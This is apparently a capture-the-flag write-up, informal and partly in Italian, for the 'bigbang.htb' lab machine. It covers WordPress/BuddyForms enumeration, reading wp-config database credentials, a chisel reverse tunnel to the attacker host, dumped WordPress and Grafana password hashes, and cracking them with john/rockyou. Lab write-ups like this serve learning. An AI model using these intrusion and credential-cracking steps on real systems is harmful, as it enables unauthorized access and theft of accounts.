@@ -1,0 +1,70 @@
+tanta enumeration, si trova subito wordpress e si usa wpscan
+
+si trova buddyforms e facilmente le cve ad esso legate
+cve non sfruttabili a causa della mancanca di un gadget per la deserializzazione che cercando online fa trovare un articolo legato ad un'altra cve:
+
+https://www.google.com/search?q=buddyforms+phar+php&client=firefox-b-e&sca_esv=342fb0b783af65fb&biw=1920&bih=928&sxsrf=AHTn8zpiEsIZcWQJbNibpcvO0Fe9saFB3g%3A1738581957392&ei=xaegZ7vTF8W1i-gPjurv6AY&ved=0ahUKEwj7ye6_sqeLAxXF2gIHHQ71G204ChDh1QMIEA&uact=5&oq=buddyforms+phar+php&gs_lp=Egxnd3Mtd2l6LXNlcnAiE2J1ZGR5Zm9ybXMgcGhhciBwaHAyBRAhGKABMgQQIRgVMgQQIRgVSO8JUMIHWPMIcAF4AJABAJgBtgGgAaECqgEDMC4yuAEDyAEA-AEBmAIDoAKwAsICCBAAGLADGO8FmAMAiAYBkAYCkgcDMS4yoAexBw&sclient=gws-wiz-serp
+
+articolo di ambionics:
+
+https://www.ambionics.io/blog/iconv-cve-2024-2961-p1
+
+spiega esattamente tutto il meccanismo. fornisce anche degli exploit che però vanno adattati. come suggerisce l'articolo, usando wrapwrap.
+
+
+
+double url encoding for exploit for last payload command
+
+on wp-config:
+/** Database username */
+define( 'DB_USER', 'wp_user' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'wp_password' );
+
+/** Database hostname */
+define( 'DB_HOST', '172.17.0.1' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+
+on machine you forward port 3306 on docker ip
+
+/tmp/chisel client 10.10.14.69:9999 R:3306:172.17.0.1:3306
+
+connect with mysql -u wp_user -p -h 127.0.0.1 -P 3306 --ssl=0 
+
+we leak:
+
+MySQL [wordpress]> select * from wp_users;
++----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
+| ID | user_login | user_pass                          | user_nicename | user_email           | user_url                | user_registered     | user_activation_key | user_status | display_name    |
++----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
+|  1 | root       | $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1 | root          | root@bigbang.htb     | http://blog.bigbang.htb | 2024-05-31 13:06:58 |                     |           0 | root            |
+|  3 | shawking   | $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./ | shawking      | shawking@bigbang.htb |                         | 2024-06-01 10:39:55 |                     |           0 | Stephen Hawking |
++----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
+2 rows in set (0.050 sec)
+
+crack it with john and rockyou and get: quantumphysics
+
+
+root:
+
+run linpeas
+find the hash in the graphana DB:
+
+sqlite> select * from user;
+1|0|admin|admin@localhost||441a715bd788e928170be7954b17cb19de835a2dedfdece8c65327cb1d9ba6bd47d70edb7421b05d9706ba6147cb71973a34|CFn7zMsQpf|CgJll8Bmss||1|1|0||2024-06-05 16:14:51|2024-06-05 16:16:02|0|2024-06-05 16:16:02|0|0|
+2|0|developer|ghubble@bigbang.htb|George Hubble|7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d960|4umebBJucv|0Whk1JNfa3||1|0|0||2024-06-05 16:17:32|2025-01-20 16:27:39|0|2025-01-20 16:27:19|0|0|ednvnl5nqhse8d
+
+
+
+standard tools dont work, so i searched online and found out that it exists a tool to convert graphana hashes to hashcat hashes
+
+developer:bigbang
+
+sulla sua home c'è un apk che decodo con apktool d file
